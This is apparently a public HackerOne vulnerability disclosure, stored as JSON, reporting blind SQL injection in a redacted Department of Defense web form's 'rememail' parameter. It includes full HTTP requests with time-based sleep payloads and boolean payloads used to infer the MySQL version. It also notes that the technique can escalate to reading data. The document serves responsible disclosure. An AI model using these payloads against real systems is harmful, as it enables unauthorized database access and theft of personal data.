{
  "id": 313037,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTMwMzc=",
  "url": "https://hackerone.com/reports/313037",
  "title": "Blind SQL injection on ████████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-02-07T01:37:21.388Z",
  "submitted_at": "2018-02-07T01:37:21.388Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "alyssa_herrera",
    "url": "/alyssa_herrera",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-10-08T18:56:43.642Z",
  "bug_reporter_agreed_on_going_public_at": "2018-08-24T01:02:14.573Z",
  "team_member_agreed_on_going_public_at": "2019-10-08T18:56:43.522Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n I discovered that a post request made to https://████████/elist/viewem6.php is vulnerable to SQL injection and is quite clearly vulnerable as I was able to induce a 2 second hang on the web page. Additionally I was able to discover the mysql version with a true/false condition.\n**Description:**\n A post request is made to hhttps://████████/elist/viewem6.php  with the following parameters, \nrememail=test@att.net\nAs to not break the rules of engagement, I used a sleep query and Boolean based commands to clearly and definitively demonstrate the vulnerability and the severity of it.\n## Impact\nCritical\n## Step-by-step Reproduction Instructions\nIn burp suite we can set a repeater request as followed. Target set as https://████/\nPOST /elist/viewem6.php HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://███████/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'\n\nObserve a 2 second hang.\nvs \n\nPOST /elist/viewem6.php HTTP/1.1\nHost: ███\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://█████████/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=test@att.net'%2b(select*from(select(sleep(0)))a)%2b'\n\nAdditionally we can detect version of the mysql by using the following request\n\nPOST /elist/viewem6.php HTTP/1.1\nHost: ██████████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://██████/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'\n\n\n\nvs \n\n\nPOST /elist/viewem6.php HTTP/1.1\nHost: ████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://█████/elist/email_escribe.php?type=R\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\nCookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=test@att.net'%2bIF(MID(@@version,1,1)=5sleep(2),1)=2%2b'\n\nWe can then discover the version of the DB, we can use queries like this to further discover data.To specify these two queries will demonstrate a true or false query. True scenario will result in the Database sleeping for 2 seconds, false it won't sleep, using this logic, I was able to evaluate if the website's Mysql version started with 4 or 5. As I said above it was possible to escalate from simple time queries to reading data and executing other commands by combing sleep queries with true/false statements.\n\n## Product, Version, and Configuration (If applicable)\nN/a\n## Suggested Mitigation/Remediation Actions\nSanitize user input and use stored procedures\n\n## Impact\n\nAn attacker would be able to read data and steal data in the Database on this website leading to PII leakage and additionally may lead to the website being compromised completely",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 14,
  "voters": [
    "alyssa_herrera",
    "term1nal",
    "codeanddecode",
    "lumbridge",
    "japz",
    "cryptographer",
    "0xm1racle",
    "silascutler",
    "n0de_detect",
    "lysis",
    "and 4 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 6797,
      "category": "researcher",
      "content": "During my previous SQL injection on a similar domain, I discovered another sub-domain that had the same exact vulnerable end point. I was able to exploit it in a similar fashion as the previous website and discovered it shared the same DB as the previous sub domain. ",
      "user": {
        "id": 13843,
        "username": "alyssa_herrera",
        "name": "Alyssa Herrera",
        "bio": "@Alyssa_Herrera_",
        "cleared": true,
        "verified": true,
        "website": "https://alyssaherrera.net",
        "location": "Mexico",
        "created_at": "2014-11-06T10:26:57.110Z",
        "url": "https://hackerone.com/alyssa_herrera",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
